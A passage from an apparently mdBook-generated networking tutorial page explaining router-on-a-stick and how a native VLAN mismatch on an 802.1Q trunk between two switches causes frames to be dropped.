<p>Note that in order to turn a router interface into a trunk port, it needs to be specifically configured in the router. This is referred to as a Router-On-A-Stick (ROAS).</p>
<h3 id="native-vlan"><a class="header" href="#native-vlan">Native VLAN</a></h3>
<p>802.1Q is equipped with an additional feature called <em>native VLAN</em>. This is configured <em>per trunk port</em> and defaults to VLAN 1. Frames in the native VLAN are not augmented with a 802.1Q tag by the switch. When a frame is received by a switch on an untagged trunk port, it is assumed that his frame belongs to the native VLAN. It is paramount that the native VLANs for a trunk link match between switches! Otherwise, situations can arise where traffic is dropped.</p>
<p><img src="Networking/Resources/Images/VLAN_native_mismatch.png" alt="" /></p>
<p>Suppose that SW1 and SW2 have their trunk ports' native VLANs set to 20 and 10, respectively. Suppose that the PC3 wants to communicate with PC1. PC3 sends a frame to SW2 which forwards it without adding a tag, since the trunk port's native VLAN is 10 and the frame originates from this VLAN. Once the frame reaches SW1, it sees that the frame is untagged and, since the native VLAN for the trunk port for SW1 is configured to be 20, it assumes that the frame pertains to VLAN 20. However, the destination MAC does not belong to VLAN 20, so the switch assumes that an error occurred and drops the frame.</p>
<p><img src="Networking/Resources/Images/VLAN_native_mismatch_2.png" alt="" /></p>
<p>Similarly, if PC3 wants to communicate with PC5, it sends out a frame to SW2. This frame is forwarded to the router and then returned back to SW2 where it is tagged with VLAN 20 and sent to SW1. However, when the frame is received by SW1, the switch expects a frame for VLAN 20 to be untagged due to its configuration. However, this frame <em>does</em> contain a tag because the native VLAN of SW2 is different. Thus, SW1 assumes an error occurred and drops the frame.</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->


                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">

            </nav>

        </div>




        <script type="text/javascript">
            window.playground_copyable = true;
        </script>


        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>

        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->

        <script type="text/javascript">
        window.addEventListener('load', function() {
            MathJax.Hub.Register.StartupHook('End', function() {
                window.setTimeout(window.print, 100);
            });
        });
        </script>

    </body>
</html>
